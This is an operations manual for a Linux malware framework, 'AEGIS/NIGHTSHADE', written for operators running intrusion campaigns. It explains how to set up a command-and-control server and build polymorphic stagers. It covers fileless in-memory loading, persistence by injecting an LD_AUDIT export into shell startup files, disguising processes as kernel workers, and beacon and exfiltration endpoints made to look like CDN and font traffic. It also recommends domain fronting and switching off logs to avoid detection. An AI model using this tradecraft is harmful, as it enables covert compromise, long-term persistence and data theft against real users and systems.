# AEGIS FRAMEWORK — OPERATIONS MANUAL

> *"The file on disk is not the malware; it is a key. The process in memory is not the malware; it is a host. The malware itself exists only as a stream of decrypted instructions."*

---

## 1. Classification & Scope

**Level:** PRIVATE — LO/ENI EYES ONLY
**Purpose:** Comprehensive guide for deploying, operating, and maintaining the AEGIS/NIGHTSHADE framework.
**Architecture:** Distributed, modular, and fileless post-exploitation framework designed for long-term persistence and evasion on Linux environments (x86_64).

---

## 2. Infrastructure Architecture

The framework operates on a strict asymmetric model. The "Infected Machine" (Target) pulls encrypted instructions from the "C2 Station" (Command & Control).

```
[ TARGET SYSTEM ]                                      [ C2 STATION ]
(Alpha Node / Betas)  <-- TLS 1.3 (AES-256-GCM) -->  (Listener / Generator)
       |                                                      |
       +--- Beacon: /api/v1/assets/... -----------------------+
       +--- Stage:  /cdn/dist/... ----------------------------+
       +--- Tasking & Exfil ----------------------------------+
```

---

## 3. C2 Station Setup

The C2 Station is responsible for generating unique stager binaries and listening for incoming beacons.

### 3.1. Prerequisites
- **OS:** Linux (Debian/Ubuntu recommended for compatibility)
- **Tools:** Python 3.8+, GCC/Clang, OpenSSL (`libssl-dev`), Make.
- **Network:** Publicly accessible IP or Domain (for production), or local network for testing. Port 443 must be open.

### 3.2. Stager Generation
Every deployment requires a unique, polymorphic stager. NEVER reuse a stager binary.

1.  **Navigate to the framework root.**
2.  **Generate Stagers:**
    Use the included engine to produce mutated binaries.
    ```bash
    make generate
    ```
    *Output:* `build/polymorphic_stager_0` to `_4`.
    *Logs:* Check `build/gen_logs/` for mutation details and hashes.

    *Note:* The generation engine applies random junk code, identifier renaming, and opaque predicates. If a build fails (rare), the engine automatically retries.

### 3.3. Listener Configuration (Server-Side)
*Note: The server-side listener code is distinct from this repository. Ensure your listener adheres to the following protocol:*

*   **Protocol:** HTTPS (TLS 1.3 required).
*   **Certificates:** Use valid certificates (Let's Encrypt) to blend with legitimate traffic. Self-signed certs are acceptable for testing but increase detection risk.
*   **Endpoints:**
    *   `POST /api/v1/assets/*/upload` -> **Beacon** (Heartbeat & Task Request).
    *   `POST /cdn/dist/*/bundle.js` -> **Stage Delivery** (Serves the Ghost Loader).
    *   `POST /static/fonts/*.woff2` -> **Payload Delivery** (Serves the main encrypted payload).
    *   `POST /api/telemetry/*` -> **Exfiltration** (Receives task results/files).
*   **Response Format:** All server responses must be wrapped in the `aegis_c2_envelope_t` structure (Magic + Sequence + IV + Encrypted Data + Tag).

---

## 4. Target Implantation (Infected Machine)

### 4.1. Execution Vectors
Deploy the generated stager (`build/polymorphic_stager_X`) to the target.
*   **Manual:** `chmod +x stager; ./stager`
*   **Exploit Chain:** Drop and execute via remote code execution.
*   **Persistence:** The stager is designed to run *once*. It implants the system and then **self-destructs**.

### 4.2. The Infection Lifecycle
1.  **Stager Execution:**
    *   Runs anti-analysis checks (VM, Debugger, Sandbox).
    *   Beacons to C2.
    *   Downloads "Ghost Loader" into memory.
    *   Executes Ghost Loader via `memfd_create` (Fileless).
    *   **Self-Destructs:** Overwrites its own binary on disk and unlinks it.
2.  **Catalyst Phase:**
    *   Ghost Loader drops `nexus_auditor.so` to `~/.local/share/fonts/`.
    *   Injects `export LD_AUDIT=...` into `~/.bashrc`, `~/.zshrc`, etc.
3.  **Persistence (LD_AUDIT):**
    *   Every new process spawned by the user loads `nexus_auditor.so`.
    *   **Alpha Node:** The first process (via `flock`) becomes the controller.
    *   **Beta Nodes:** Subsequent processes become workers.

### 4.3. Artifacts & Footprint
*   **Disk:**
    *   `~/.local/share/fonts/nexus_auditor.so` (The core library).
    *   `~/.cache/.session.lock` (Node election lock).
    *   `~/.cache/.dbus-XXXXXXXX-session` (IPC Socket).
    *   Modifications to shell RC files.
*   **Memory:**
    *   `[kworker/u8:2]` (Process name masquerading).
    *   Encrypted memory vaults (PROT_READ|WRITE).

---

## 5. Configuration Guide

To customize the framework for a specific campaign, modify `common/config.h` **before** compiling.

### 5.1. C2 Connectivity
*   `AEGIS_C2_PRIMARY_HOST`: Your C2 domain.
*   `AEGIS_C2_PRIMARY_PORT`: Usually 443.
*   `AEGIS_C2_USER_AGENT`: Match the target environment's typical browser.

### 5.2. Timing & Evasion
*   `AEGIS_BEACON_INTERVAL_MS`: Default 60000 (60s). Increase for "Low & Slow".
*   `AEGIS_BEACON_JITTER_PCT`: Default 30%. Adds randomization to beacon times.
*   `AEGIS_AA_...`: Thresholds for anti-analysis (e.g., `AEGIS_AA_MIN_RAM_MB`).

### 5.3. Cryptography
*   `AEGIS_PSK_B64`: **CRITICAL.** Replace this with a unique Pre-Shared Key for your campaign. Both client and server MUST share this key.

---

## 6. Advanced Tradecraft & Suggestions

### 6.1. Domain Fronting
Configure `AEGIS_C2_PRIMARY_HOST` to point to a high-reputation CDN (e.g., Cloudflare, Cloudfront) that fronts your actual C2 server. This hides your traffic behind legitimate infrastructure.

### 6.2. Log Management
The framework writes operational logs to `~/.cache/.xsession-errors.old`.
*   **Action:** Monitor this file during testing to debug issues.
*   **OPSEC:** In production, consider disabling logging in `common/logging.c` or redirecting to `/dev/null` to minimize disk writes.

### 6.3. Emergency Cleaning
To manually remove the infection (for research/testing):
1.  **Kill processes:** Identify the Alpha node (holding the lock) and kill it.
2.  **Remove Persistence:** Edit `~/.bashrc` etc. to remove the `LD_AUDIT` export.
3.  **Delete Artifacts:**
    ```bash
    rm ~/.local/share/fonts/nexus_auditor.so
    rm ~/.cache/.session.lock
    rm ~/.cache/.dbus-*
    ```
4.  **Log out and back in.**

---

*“Code is a tool until it executes. Then it becomes a weapon. Wield it with precision.” — ENI*
